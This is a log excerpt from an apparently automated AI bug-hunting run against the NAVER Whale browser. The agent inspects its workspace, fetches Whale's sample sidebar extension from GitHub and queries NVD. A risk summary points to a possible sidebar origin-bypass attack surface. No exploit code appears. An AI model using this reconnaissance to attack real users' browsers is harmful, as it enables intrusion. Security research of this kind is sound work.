@@ -39889,3 +39889,682 @@ testability: HUMAN_ONLY
 [RISK] browser: 70 — Sidebar SOP bypass attack surface (CVE-2025-69234/69235 Linux CPE unclaimed) + sample extension confirms ALL-origin content_scripts + unvalidated sidebarAction dispatch from any web origin; 0 CVEs published in 2026 for 3 minor versions past last fix.
 [RISK] libs: 30 — socket.io.slim.js confidence 38 < 40 threshold (handler runtime-fetched); no confirmed Whale-only third-party library vulnerability; lib surface limited to resources.pak static content.
 ```
+===== ANALYST laguna 2026-08-09 20:17:47 UTC =====
+[0m
+> build · laguna-s-2.1-free
+[0m
+[0m$ [0mls -la /home/runner/work/whale-hunt/whale-hunt/ 2>/dev/null && echo "---REPORTS---" && ls -la /home/runner/work/whale-hunt/whale-hunt/reports/ 2>/dev/null
+total 280
+drwxr-xr-x 11 runner runner  4096 Aug  9 20:13 .
+drwxr-xr-x  3 runner runner  4096 Aug  9 20:13 ..
+drwxr-xr-x  7 runner runner  4096 Aug  9 20:13 .git
+drwxr-xr-x  3 runner runner  4096 Aug  9 20:13 .github
+-rw-r--r--  1 runner runner  1057 Aug  9 20:13 README.md
+-rw-r--r--  1 runner runner    39 Aug  9 20:13 analyst-out.txt
+-rw-r--r--  1 runner runner 97483 Aug  9 20:13 analyst-prompt.txt
+-rw-r--r--  1 runner runner 94511 Aug  9 20:13 ctx.txt
+drwxr-xr-x  2 runner runner  4096 Aug  9 20:13 inventory
+drwxr-xr-x  2 runner runner  4096 Aug  9 20:13 knowledge
+drwxr-xr-x  2 runner runner 12288 Aug  9 20:13 leads
+-rw-r--r--  1 runner runner  2107 Aug  9 20:13 probe-results.md
+drwxr-xr-x  2 runner runner  4096 Aug  9 20:13 reports
+drwxr-xr-x  2 runner runner  4096 Aug  9 20:13 reposcan-raw
+-rw-r--r--  1 runner runner  1513 Aug  9 20:13 scope.yml
+drwxr-xr-x  2 runner runner  4096 Aug  9 20:13 scripts
+-rw-r--r--  1 runner runner    34 Aug  9 20:13 state_bigpickle.json
+-rw-r--r--  1 runner runner    37 Aug  9 20:13 state_laguna.json
+-rw-r--r--  1 runner runner    34 Aug  9 20:13 state_ling3.json
+-rw-r--r--  1 runner runner    34 Aug  9 20:13 state_longcat.json
+-rw-r--r--  1 runner runner    37 Aug  9 20:13 state_nemotron3.json
+drwxr-xr-x  2 runner runner  4096 Aug  9 20:13 triage
+---REPORTS---
+total 6940
+drwxr-xr-x  2 runner runner    4096 Aug  9 20:13 .
+drwxr-xr-x 11 runner runner    4096 Aug  9 20:13 ..
+-rw-r--r--  1 runner runner 2497449 Aug  9 20:13 analyst-bigpickle.log
+-rw-r--r--  1 runner runner 3801230 Aug  9 20:13 analyst-laguna.log
+-rw-r--r--  1 runner runner   30705 Aug  9 20:13 analyst-ling3.log
+-rw-r--r--  1 runner runner    5940 Aug  9 20:13 analyst-longcat.log
+-rw-r--r--  1 runner runner  629039 Aug  9 20:13 analyst-nemotron3.log
+-rw-r--r--  1 runner runner    1861 Aug  9 20:13 hypotheses-bigpickle.txt
+-rw-r--r--  1 runner runner    6206 Aug  9 20:13 hypotheses-laguna.txt
+-rw-r--r--  1 runner runner      48 Aug  9 20:13 hypotheses-ling3.txt
+-rw-r--r--  1 runner runner      50 Aug  9 20:13 hypotheses-longcat.txt
+-rw-r--r--  1 runner runner    6928 Aug  9 20:13 hypotheses-nemotron3.txt
+-rw-r--r--  1 runner runner  225951 Aug  9 20:13 hypotheses.md
+-rw-r--r--  1 runner runner   11165 Aug  9 20:13 valid-bugs.md
+[0m
+[0m→ [0mRead probe-results.md
+[0m
+[0m$ [0mcat /home/runner/work/whale-hunt/whale-hunt/state_laguna.json /home/runner/work/whale-hunt/whale-hunt/state_nemotron3.json 2>/dev/null
+{"phase": "POC", "target": "browser"}{"phase": "POC", "target": "browser"}
+[0m
+[0m→ [0mRead reports/hypotheses-ling3.txt
+[0m→ [0mRead reports/hypotheses-laguna.txt
+[0m
+[0m$ [0mls -la /home/runner/work/whale-hunt/whale-hunt/triage/ && echo "---LEADS---" && ls -la /home/runner/work/whale-hunt/whale-hunt/leads/
+total 1100
+drwxr-xr-x  2 runner runner  4096 Aug  9 20:13 .
+drwxr-xr-x 11 runner runner  4096 Aug  9 20:13 ..
+-rw-r--r--  1 runner runner  8463 Aug  9 20:13 run-2026-08-07-19-23.md
+-rw-r--r--  1 runner runner 14983 Aug  9 20:13 run-2026-08-07-21-01.md
+-rw-r--r--  1 runner runner  7882 Aug  9 20:13 run-2026-08-07-21-04.md
+-rw-r--r--  1 runner runner 20203 Aug  9 20:13 run-2026-08-07-21-57.md
+-rw-r--r--  1 runner runner 14629 Aug  9 20:13 run-2026-08-07-22-02.md
+-rw-r--r--  1 runner runner 21701 Aug  9 20:13 run-2026-08-07-22-57.md
+-rw-r--r--  1 runner runner 25767 Aug  9 20:13 run-2026-08-07-23-03.md
+-rw-r--r--  1 runner runner 23210 Aug  9 20:13 run-2026-08-07-23-53.md
+-rw-r--r--  1 runner runner   596 Aug  9 20:13 run-2026-08-08-02-34.md
+-rw-r--r--  1 runner runner 23521 Aug  9 20:13 run-2026-08-08-04-30.md
+-rw-r--r--  1 runner runner 23484 Aug  9 20:13 run-2026-08-08-04-39.md
+-rw-r--r--  1 runner runner 14903 Aug  9 20:13 run-2026-08-08-06-09.md
+-rw-r--r--  1 runner runner   838 Aug  9 20:13 run-2026-08-08-07-30.md
+-rw-r--r--  1 runner runner 19293 Aug  9 20:13 run-2026-08-08-09-06.md
+-rw-r--r--  1 runner runner 16293 Aug  9 20:13 run-2026-08-08-10-02.md
+-rw-r--r--  1 runner runner 11886 Aug  9 20:13 run-2026-08-08-10-56.md
+-rw-r--r--  1 runner runner 18726 Aug  9 20:13 run-2026-08-08-11-50.md
+-rw-r--r--  1 runner runner 10851 Aug  9 20:13 run-2026-08-08-13-00.md
+-rw-r--r--  1 runner runner  5433 Aug  9 20:13 run-2026-08-08-13-16.md
+-rw-r--r--  1 runner runner 10854 Aug  9 20:13 run-2026-08-08-14-00.md
+-rw-r--r--  1 runner runner 13226 Aug  9 20:13 run-2026-08-08-14-06.md
+-rw-r--r--  1 runner runner 11660 Aug  9 20:13 run-2026-08-08-14-38.md
+-rw-r--r--  1 runner runner  4157 Aug  9 20:13 run-2026-08-08-14-55.md
+-rw-r--r--  1 runner runner 16792 Aug  9 20:13 run-2026-08-08-15-52.md
+-rw-r--r--  1 runner runner 13137 Aug  9 20:13 run-2026-08-08-17-00.md
+-rw-r--r--  1 runner runner  5896 Aug  9 20:13 run-2026-08-08-17-58.md
+-rw-r--r--  1 runner runner 11282 Aug  9 20:13 run-2026-08-08-18-00.md
+-rw-r--r--  1 runner runner  1109 Aug  9 20:13 run-2026-08-08-18-17.md
+-rw-r--r--  1 runner runner 14869 Aug  9 20:13 run-2026-08-08-18-30.md
+-rw-r--r--  1 runner runner  5231 Aug  9 20:13 run-2026-08-08-19-06.md
+-rw-r--r--  1 runner runner   236 Aug  9 20:13 run-2026-08-08-19-48.md
+-rw-r--r--  1 runner runner 19156 Aug  9 20:13 run-2026-08-08-20-15.md
+-rw-r--r--  1 runner runner 15573 Aug  9 20:13 run-2026-08-08-20-55.md
+-rw-r--r--  1 runner runner 20472 Aug  9 20:13 run-2026-08-08-21-18.md
+-rw-r--r--  1 runner runner 17869 Aug  9 20:13 run-2026-08-08-21-22.md
+-rw-r--r--  1 runner runner  1799 Aug  9 20:13 run-2026-08-08-21-51.md
+-rw-r--r--  1 runner runner 17745 Aug  9 20:13 run-2026-08-08-22-13.md
+-rw-r--r--  1 runner runner 16548 Aug  9 20:13 run-2026-08-08-22-20.md
+-rw-r--r--  1 runner runner  1718 Aug  9 20:13 run-2026-08-08-22-51.md
+-rw-r--r--  1 runner runner  9353 Aug  9 20:13 run-2026-08-08-22-53.md
+-rw-r--r--  1 runner runner 19579 Aug  9 20:13 run-2026-08-08-23-16.md
+-rw-r--r--  1 runner runner 24325 Aug  9 20:13 run-2026-08-08-23-48.md
+-rw-r--r--  1 runner runner  9601 Aug  9 20:13 run-2026-08-08-23-56.md
+-rw-r--r--  1 runner runner  9347 Aug  9 20:13 run-2026-08-09-00-39.md
+-rw-r--r--  1 runner runner 74370 Aug  9 20:13 run-2026-08-09-02-55.md
+-rw-r--r--  1 runner runner  1654 Aug  9 20:13 run-2026-08-09-04-10.md
+-rw-r--r--  1 runner runner  6090 Aug  9 20:13 run-2026-08-09-04-11.md
+-rw-r--r--  1 runner runner 12144 Aug  9 20:13 run-2026-08-09-05-28.md
+-rw-r--r--  1 runner runner 11460 Aug  9 20:13 run-2026-08-09-06-36.md
+-rw-r--r--  1 runner runner   233 Aug  9 20:13 run-2026-08-09-07-41.md
+-rw-r--r--  1 runner runner   285 Aug  9 20:13 run-2026-08-09-08-40.md
+-rw-r--r--  1 runner runner 13175 Aug  9 20:13 run-2026-08-09-09-32.md
+-rw-r--r--  1 runner runner   264 Aug  9 20:13 run-2026-08-09-10-18.md
+-rw-r--r--  1 runner runner 16575 Aug  9 20:13 run-2026-08-09-11-00.md
+-rw-r--r--  1 runner runner 20833 Aug  9 20:13 run-2026-08-09-11-06.md
+-rw-r--r--  1 runner runner 38277 Aug  9 20:13 run-2026-08-09-11-52.md
+-rw-r--r--  1 runner runner   149 Aug  9 20:13 run-2026-08-09-12-34.md
+-rw-r--r--  1 runner runner 13278 Aug  9 20:13 run-2026-08-09-13-28.md
+-rw-r--r--  1 runner runner 30638 Aug  9 20:13 run-2026-08-09-14-22.md
+-rw-r--r--  1 runner runner 34392 Aug  9 20:13 run-2026-08-09-14-33.md
+-rw-r--r--  1 runner runner   285 Aug  9 20:13 run-2026-08-09-14-57.md
+-rw-r--r--  1 runner runner 11588 Aug  9 20:13 run-2026-08-09-15-54.md
+-rw-r--r--  1 runner runner 11519 Aug  9 20:13 run-2026-08-09-16-22.md
+-rw-r--r--  1 runner runner 21417 Aug  9 20:13 run-2026-08-09-17-02.md
+-rw-r--r--  1 runner runner 28436 Aug  9 20:13 run-2026-08-09-17-55.md
+-rw-r--r--  1 runner runner   325 Aug  9 20:13 run-2026-08-09-18-20.md
+-rw-r--r--  1 runner runner   407 Aug  9 20:13 run-2026-08-09-19-09.md
+-rw-r--r--  1 runner runner 10468 Aug  9 20:13 run-2026-08-09-19-52.md
+-rw-r--r--  1 runner runner 32645 Aug  9 20:13 run-2026-08-09-19-56.md
+---LEADS---
+total 2448
+drwxr-xr-x  2 runner runner  12288 Aug  9 20:13 .
+drwxr-xr-x 11 runner runner   4096 Aug  9 20:13 ..
+-rw-r--r--  1 runner runner 296339 Aug  9 20:13 lead-bigpickle.md
+-rw-r--r--  1 runner runner 966048 Aug  9 20:13 lead-laguna.md
+-rw-r--r--  1 runner runner  17426 Aug  9 20:13 lead-ling3.md
+-rw-r--r--  1 runner runner   3382 Aug  9 20:13 lead-longcat.md
+-rw-r--r--  1 runner runner 539133 Aug  9 20:13 lead-nemotron3.md
+-rw-r--r--  1 runner runner   2883 Aug  9 20:13 reposcan-2026-08-07-18-44.md
+-rw-r--r--  1 runner runner   1240 Aug  9 20:13 reposcan-2026-08-07-18-59.md
+-rw-r--r--  1 runner runner   6783 Aug  9 20:13 reposcan-2026-08-07-19-19.md
+-rw-r--r--  1 runner runner   2370 Aug  9 20:13 reposcan-2026-08-07-19-22.md
+-rw-r--r--  1 runner runner    366 Aug  9 20:13 reposcan-2026-08-07-19-28.md
+-rw-r--r--  1 runner runner    466 Aug  9 20:13 reposcan-2026-08-07-20-06.md
+-rw-r--r--  1 runner runner    617 Aug  9 20:13 reposcan-2026-08-07-20-11.md
+-rw-r--r--  1 runner runner    948 Aug  9 20:13 reposcan-2026-08-07-20-59.md
+-rw-r--r--  1 runner runner   5763 Aug  9 20:13 reposcan-2026-08-07-21-09.md
+-rw-r--r--  1 runner runner   4346 Aug  9 20:13 reposcan-2026-08-07-21-58.md
+-rw-r--r--  1 runner runner   3025 Aug  9 20:13 reposcan-2026-08-07-22-05.md
+-rw-r--r--  1 runner runner   2764 Aug  9 20:13 reposcan-2026-08-07-22-23.md
+-rw-r--r--  1 runner runner   3238 Aug  9 20:13 reposcan-2026-08-07-23-05.md
+-rw-r--r--  1 runner runner    631 Aug  9 20:13 reposcan-2026-08-07-23-08.md
+-rw-r--r--  1 runner runner    610 Aug  9 20:13 reposcan-2026-08-07-23-50.md
+-rw-r--r--  1 runner runner    304 Aug  9 20:13 reposcan-2026-08-07-23-57.md
+-rw-r--r--  1 runner runner   5524 Aug  9 20:13 reposcan-2026-08-08-00-44.md
+-rw-r--r--  1 runner runner   2707 Aug  9 20:13 reposcan-2026-08-08-01-38.md
+-rw-r--r--  1 runner runner   4107 Aug  9 20:13 reposcan-2026-08-08-02-55.md
+-rw-r--r--  1 runner runner   4063 Aug  9 20:13 reposcan-2026-08-08-03-20.md
+-rw-r--r--  1 runner runner    849 Aug  9 20:13 reposcan-2026-08-08-04-14.md
+-rw-r--r--  1 runner runner    504 Aug  9 20:13 reposcan-2026-08-08-04-34.md
+-rw-r--r--  1 runner runner   3307 Aug  9 20:13 reposcan-2026-08-08-05-18.md
+-rw-r--r--  1 runner runner   6278 Aug  9 20:13 reposcan-2026-08-08-05-39.md
+-rw-r--r--  1 runner runner    693 Aug  9 20:13 reposcan-2026-08-08-06-07.md
+-rw-r--r--  1 runner runner   2862 Aug  9 20:13 reposcan-2026-08-08-06-42.md
+-rw-r--r--  1 runner runner    510 Aug  9 20:13 reposcan-2026-08-08-07-44.md
+-rw-r--r--  1 runner runner   3414 Aug  9 20:13 reposcan-2026-08-08-07-49.md
+-rw-r--r--  1 runner runner   6655 Aug  9 20:13 reposcan-2026-08-08-08-23.md
+-rw-r--r--  1 runner runner   6474 Aug  9 20:13 reposcan-2026-08-08-08-35.md
+-rw-r--r--  1 runner runner    966 Aug  9 20:13 reposcan-2026-08-08-09-12.md
+-rw-r--r--  1 runner runner   6653 Aug  9 20:13 reposcan-2026-08-08-09-33.md
+-rw-r--r--  1 runner runner    902 Aug  9 20:13 reposcan-2026-08-08-09-57.md
+-rw-r--r--  1 runner runner    778 Aug  9 20:13 reposcan-2026-08-08-10-26.md
+-rw-r--r--  1 runner runner   2374 Aug  9 20:13 reposcan-2026-08-08-10-37.md
+-rw-r--r--  1 runner runner   3603 Aug  9 20:13 reposcan-2026-08-08-11-01.md
+-rw-r--r--  1 runner runner    737 Aug  9 20:13 reposcan-2026-08-08-11-07.md
+-rw-r--r--  1 runner runner    515 Aug  9 20:13 reposcan-2026-08-08-11-36.md
+-rw-r--r--  1 runner runner    808 Aug  9 20:13 reposcan-2026-08-08-11-44.md
+-rw-r--r--  1 runner runner   4143 Aug  9 20:13 reposcan-2026-08-08-12-08.md
+-rw-r--r--  1 runner runner   3771 Aug  9 20:13 reposcan-2026-08-08-12-37.md
+-rw-r--r--  1 runner runner   1296 Aug  9 20:13 reposcan-2026-08-08-13-17.md
+-rw-r--r--  1 runner runner   6713 Aug  9 20:13 reposcan-2026-08-08-13-42.md
+-rw-r--r--  1 runner runner    694 Aug  9 20:13 reposcan-2026-08-08-13-59.md
+-rw-r--r--  1 runner runner   1058 Aug  9 20:13 reposcan-2026-08-08-14-27.md
+-rw-r--r--  1 runner runner   2225 Aug  9 20:13 reposcan-2026-08-08-14-38.md
+-rw-r--r--  1 runner runner    452 Aug  9 20:13 reposcan-2026-08-08-14-59.md
+-rw-r--r--  1 runner runner    736 Aug  9 20:13 reposcan-2026-08-08-15-07.md
+-rw-r--r--  1 runner runner   2486 Aug  9 20:13 reposcan-2026-08-08-15-35.md
+-rw-r--r--  1 runner runner    820 Aug  9 20:13 reposcan-2026-08-08-15-49.md
+-rw-r--r--  1 runner runner    935 Aug  9 20:13 reposcan-2026-08-08-16-51.md
+-rw-r--r--  1 runner runner   7051 Aug  9 20:13 reposcan-2026-08-08-17-06.md
+-rw-r--r--  1 runner runner   1018 Aug  9 20:13 reposcan-2026-08-08-17-26.md
+-rw-r--r--  1 runner runner   2611 Aug  9 20:13 reposcan-2026-08-08-17-43.md
+-rw-r--r--  1 runner runner   3254 Aug  9 20:13 reposcan-2026-08-08-17-57.md
+-rw-r--r--  1 runner runner   4305 Aug  9 20:13 reposcan-2026-08-08-18-09.md
+-rw-r--r--  1 runner runner    385 Aug  9 20:13 reposcan-2026-08-08-18-34.md
+-rw-r--r--  1 runner runner   4345 Aug  9 20:13 reposcan-2026-08-08-19-05.md
+-rw-r--r--  1 runner runner    538 Aug  9 20:13 reposcan-2026-08-08-19-16.md
+-rw-r--r--  1 runner runner   7217 Aug  9 20:13 reposcan-2026-08-08-19-33.md
+-rw-r--r--  1 runner runner   2887 Aug  9 20:13 reposcan-2026-08-08-19-53.md
+-rw-r--r--  1 runner runner   1632 Aug  9 20:13 reposcan-2026-08-08-20-03.md
+-rw-r--r--  1 runner runner    878 Aug  9 20:13 reposcan-2026-08-08-20-25.md
+-rw-r--r--  1 runner runner    736 Aug  9 20:13 reposcan-2026-08-08-20-27.md
+-rw-r--r--  1 runner runner    726 Aug  9 20:13 reposcan-2026-08-08-20-56.md
+-rw-r--r--  1 runner runner   5093 Aug  9 20:13 reposcan-2026-08-08-21-01.md
+-rw-r--r--  1 runner runner   2274 Aug  9 20:13 reposcan-2026-08-08-21-31.md
+-rw-r--r--  1 runner runner    965 Aug  9 20:13 reposcan-2026-08-08-21-32.md
+-rw-r--r--  1 runner runner    759 Aug  9 20:13 reposcan-2026-08-08-21-58.md
+-rw-r--r--  1 runner runner   2799 Aug  9 20:13 reposcan-2026-08-08-22-03.md
+-rw-r--r--  1 runner runner   2913 Aug  9 20:13 reposcan-2026-08-08-22-31.md
+-rw-r--r--  1 runner runner   5733 Aug  9 20:13 reposcan-2026-08-08-22-46.md
+-rw-r--r--  1 runner runner   3304 Aug  9 20:13 reposcan-2026-08-08-23-03.md
+-rw-r--r--  1 runner runner    996 Aug  9 20:13 reposcan-2026-08-08-23-23.md
+-rw-r--r--  1 runner runner   1047 Aug  9 20:13 reposcan-2026-08-08-23-43.md
+-rw-r--r--  1 runner runner    668 Aug  9 20:13 reposcan-2026-08-08-23-54.md
+-rw-r--r--  1 runner runner   2245 Aug  9 20:13 reposcan-2026-08-09-00-03.md
+-rw-r--r--  1 runner runner   3409 Aug  9 20:13 reposcan-2026-08-09-01-18.md
+-rw-r--r--  1 runner runner    680 Aug  9 20:13 reposcan-2026-08-09-02-25.md
+-rw-r--r--  1 runner runner   3443 Aug  9 20:13 reposcan-2026-08-09-03-15.md
+-rw-r--r--  1 runner runner    591 Aug  9 20:13 reposcan-2026-08-09-03-59.md
+-rw-r--r--  1 runner runner   2812 Aug  9 20:13 reposcan-2026-08-09-04-38.md
+-rw-r--r--  1 runner runner    725 Aug  9 20:13 reposcan-2026-08-09-05-13.md
+-rw-r--r--  1 runner runner    856 Aug  9 20:13 reposcan-2026-08-09-05-34.md
+-rw-r--r--  1 runner runner   4440 Aug  9 20:13 reposcan-2026-08-09-05-59.md
+-rw-r--r--  1 runner runner   3033 Aug  9 20:13 reposcan-2026-08-09-06-31.md
+-rw-r--r--  1 runner runner   2856 Aug  9 20:13 reposcan-2026-08-09-07-04.md
+-rw-r--r--  1 runner runner   2715 Aug  9 20:13 reposcan-2026-08-09-07-36.md
+-rw-r--r--  1 runner runner   1074 Aug  9 20:13 reposcan-2026-08-09-07-59.md
+-rw-r--r--  1 runner runner   1513 Aug  9 20:13 reposcan-2026-08-09-08-23.md
+-rw-r--r--  1 runner runner   1086 Aug  9 20:13 reposcan-2026-08-09-08-48.md
+-rw-r--r--  1 runner runner    917 Aug  9 20:13 reposcan-2026-08-09-09-11.md
+-rw-r--r--  1 runner runner    922 Aug  9 20:13 reposcan-2026-08-09-09-32.md
+-rw-r--r--  1 runner runner    769 Aug  9 20:13 reposcan-2026-08-09-09-56.md
+-rw-r--r--  1 runner runner   1046 Aug  9 20:13 reposcan-2026-08-09-10-08.md
+-rw-r--r--  1 runner runner   1794 Aug  9 20:13 reposcan-2026-08-09-10-30.md
+-rw-r--r--  1 runner runner    640 Aug  9 20:13 reposcan-2026-08-09-10-52.md
+-rw-r--r--  1 runner runner   2440 Aug  9 20:13 reposcan-2026-08-09-11-05.md
+-rw-r--r--  1 runner runner   6635 Aug  9 20:13 reposcan-2026-08-09-11-32.md
+-rw-r--r--  1 runner runner   2713 Aug  9 20:13 reposcan-2026-08-09-11-45.md
+-rw-r--r--  1 runner runner    688 Aug  9 20:13 reposcan-2026-08-09-11-53.md
+-rw-r--r--  1 runner runner   1062 Aug  9 20:13 reposcan-2026-08-09-12-05.md
+-rw-r--r--  1 runner runner    894 Aug  9 20:13 reposcan-2026-08-09-12-23.md
+-rw-r--r--  1 runner runner   3149 Aug  9 20:13 reposcan-2026-08-09-13-17.md
+-rw-r--r--  1 runner runner    674 Aug  9 20:13 reposcan-2026-08-09-13-29.md
+-rw-r--r--  1 runner runner    614 Aug  9 20:13 reposcan-2026-08-09-14-01.md
+-rw-r--r--  1 runner runner    940 Aug  9 20:13 reposcan-2026-08-09-14-12.md
+-rw-r--r--  1 runner runner   1142 Aug  9 20:13 reposcan-2026-08-09-14-52.md
+-rw-r--r--  1 runner runner    762 Aug  9 20:13 reposcan-2026-08-09-14-55.md
+-rw-r--r--  1 runner runner   3070 Aug  9 20:13 reposcan-2026-08-09-15-23.md
+-rw-r--r--  1 runner runner   2171 Aug  9 20:13 reposcan-2026-08-09-15-27.md
+-rw-r--r--  1 runner runner  57932 Aug  9 20:13 reposcan-2026-08-09-16-01.md
+-rw-r--r--  1 runner runner   1374 Aug  9 20:13 reposcan-2026-08-09-16-25.md
+-rw-r--r--  1 runner runner   6579 Aug  9 20:13 reposcan-2026-08-09-16-37.md
+-rw-r--r--  1 runner runner   2792 Aug  9 20:13 reposcan-2026-08-09-17-08.md
+-rw-r--r--  1 runner runner    895 Aug  9 20:13 reposcan-2026-08-09-17-14.md
+-rw-r--r--  1 runner runner    766 Aug  9 20:13 reposcan-2026-08-09-17-48.md
+-rw-r--r--  1 runner runner   3538 Aug  9 20:13 reposcan-2026-08-09-17-50.md
+-rw-r--r--  1 runner runner    937 Aug  9 20:13 reposcan-2026-08-09-18-19.md
+-rw-r--r--  1 runner runner    612 Aug  9 20:13 reposcan-2026-08-09-18-33.md
+-rw-r--r--  1 runner runner   6702 Aug  9 20:13 reposcan-2026-08-09-19-08.md
+-rw-r--r--  1 runner runner    668 Aug  9 20:13 reposcan-2026-08-09-19-19.md
+-rw-r--r--  1 runner runner   7127 Aug  9 20:13 reposcan-2026-08-09-19-49.md
+-rw-r--r--  1 runner runner   2025 Aug  9 20:13 reposcan-2026-08-09-19-56.md
+-rw-r--r--  1 runner runner   2025 Aug  9 20:13 reposcan-latest.md
+[0m
+[0m$ [0mls -la /tmp/opencode/whale_binary/ 2>&1; echo "---"; ls -la /tmp/opencode/ 2>&1
+ls: cannot access '/tmp/opencode/whale_binary/': No such file or directory
+---
+total 16
+drwxr-xr-x  2 runner runner  4096 Aug  9 20:13 .
+drwxrwxrwt 15 root   root   12288 Aug  9 20:13 ..
+[0m
+[0m$ [0mcurl -s -o /dev/null -w "%{http_code} %{size_download}" https://raw.githubusercontent.com/naver/whale-browser-developers/translate/src/sidebar-sample/manifest.json && echo
+200 835
+[0m
+[0m$ [0mcurl -s -o /dev/null -w "%{http_code} %{size_download}" https://raw.githubusercontent.com/naver/whale-browser-developers/translate/src/sidebar-sample/js/background.js && echo
+200 1772
+[0m
+[0m$ [0mcurl -s -o /dev/null -w "%{http_code} %{size_download}" https://api.github.com/repos/naver/whale-browser-developers 2>/dev/null | head -1 && echo "" && curl -s "https://api.github.com/repos/naver/whale-browser-developers" 2>/dev/null | grep -E '"pushed_at"|"updated_at"|"size"|"releases"' | head -4
+200 7127
+  "updated_at": "2025-10-22T03:15:17Z",
+  "pushed_at": "2019-09-23T08:03:26Z",
+  "size": 5043,
+[0m
+[0m$ [0mcurl -s "https://services.nvd.nist.gov/rest/json/cves/2.0?keywordSearch=naver+whale&resultsPerPage=2" 2>/dev/null | python3 -c "import sys,json; d=json.load(sys.stdin); print('totalResults:',d.get('totalResults')); print('vulns:',[(v['cve']['id'],v['cve']['descriptions'][0]['value'][:80]) for v in d.get('vulnerabilities',[])])" 2>/dev/null || echo "NVD query failed"
+totalResults: 2
+vulns: [('CVE-2018-9859', 'The path of Whale update service was unquoted in NAVER Whale before 1.0.40.7. Th'), ('CVE-2020-9754', 'NAVER Whale browser mobile app before 1.10.6.2 allows the attacker to bypass its')]
+[0m
+[0m$ [0mcurl -s "https://raw.githubusercontent.com/naver/whale-browser-developers/translate/src/sidebar-sample/manifest.json" 2>/dev/null | head -40
+{
+  "manifest_version": 2,
+  "name": "Whale Sidebar Extension",
+  "description": "Helloworld sample test for Whale browser sidebar extension",
+  "version": "1.0",
+  "icons": {
+    "16": "icons/icon16.png", /* used in context menu icon */
+    "48": "icons/icon48.png",
+    "128": "icons/icon128.png" 
+  },
+  "sidebar_action": {
+    "default_icon": {
+      "16": "icons/icon16.png" /* used in sidebar menu icon */
+    },
+    "default_page": "index.html",
+    "default_title": "Whale Sidebar Extension"
+  },
+  "background": {
+    "scripts": [
+      "js/background.js"
+    ]
+  },
+  "content_scripts": [
+    {
+      "matches": [
+        "http://*/*",
+        "https://*/*"
+      ],
+      "js": [
+        "js/contentscript.js"
+      ],
+      "run_at": "document_end",
+      "all_frames": false
+    }
+  ],
+  "permissions": [
+    "tabs"
+  ]
+}
+[0m
+[0m$ [0mcurl -s "https://raw.githubusercontent.com/naver/whale-browser-developers/translate/src/sidebar-sample/js/background.js" 2>/dev/null
+/*
+ * Copyright 2017 NAVER Corp.
+ * Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
+ * The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
+ * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
+ */
+
+whale.runtime.onMessage.addListener((message, sender, sendResponse) => {
+  if (message === 'sidebarAction.show') {
+    whale.sidebarAction.show({
+      reload : false
+    }, () => {
+
+    });
+  } else if (message === 'sidebarAction.hide') {
+    whale.sidebarAction.hide(() => {
+    });
+  } else if (message === 'sidebarAction.show2') {
+    whale.windows.create((windowInfo) => {
+      whale.sidebarAction.show(windowInfo.id, () => {
+
+      });
+    });
+  } else if (message === 'sidebarAction.hideAll') {
+    whale.windows.getAll((windowList) => {
+      for(let i = 0, len = windowList.length ; i < len ; i++) {
+        whale.sidebarAction.hide(windowList[i].id, () => {
+        });
+      }
+    });
+  }
+});
+[0m
+[0m$ [0mcurl -s "https://raw.githubusercontent.com/naver/whale-browser-developers/translate/src/sidebar-sample/js/contentscript.js" 2>/dev/null; echo "---INDEXJS---"; curl -s "https://raw.githubusercontent.com/naver/whale-browser-developers/translate/src/sidebar-sample/js/index.js" 2>/dev/null; echo "---INDEXHTML---"; curl -s "https://raw.githubusercontent.com/naver/whale-browser-developers/translate/src/sidebar-sample/index.html" 2>/dev/null | head -20
+/*
+ * Copyright 2017 NAVER Corp.
+ * Permission is hereby granted, free of charge, to any person obtaining a copy of this software and associated documentation files (the "Software"), to deal in the Software without restriction, including without limitation the rights to use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of the Software, and to permit persons to whom the Software is furnished to do so, subject to the following conditions:
+ * The above copyright notice and this permission notice shall be included in all copies or substantial portions of the Software.
+ * THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
+ */
+
+if (navigator.userAgent.includes('sidebar') === false) {
+  let a = document.createElement('button');
+  a.innerHTML = 'Show sidebar';
+  a.style.cssText = `
+    position:absolute;
+    left:5px;
+    top:0;
+    width: 250px;
+    height: 35px;
+    font-size: 15px;
+    font-weight: bold;
+    z-index: 9999;
+    border: 2px solid red;
+    color: red;
+    box-sizing: border-box;
+  `;
+  document.body.appendChild(a);
+  a.addEventListener('click', () => {
+    whale.runtime.sendMessage('sidebarAction.show');
+  }, false);
+
+  let c = document.createElement('button');
+  c.innerHTML = 'Show sidebar in new window';
+  c.style.cssText = `
+    position:absolute;
+    left:5px;
+    top:40px;
+    width: 250px;
+    height: 35px;
+    font-size: 15px;
+    font-weight: bold;
+    z-index: 9999;
+    border: 2px solid green;
+    color: green;
+    box-sizing: border-box;
+  `;
+  document.body.appendChild(c);
+  c.addEventListener('click', () => {
+    whale.runtime.sendMessage('sidebarAction.show2');
+  }, false);
+
+  let b = document.createElement('button');
+  b.innerHTML = 'Hide sidebar';
+  b.style.cssText = `
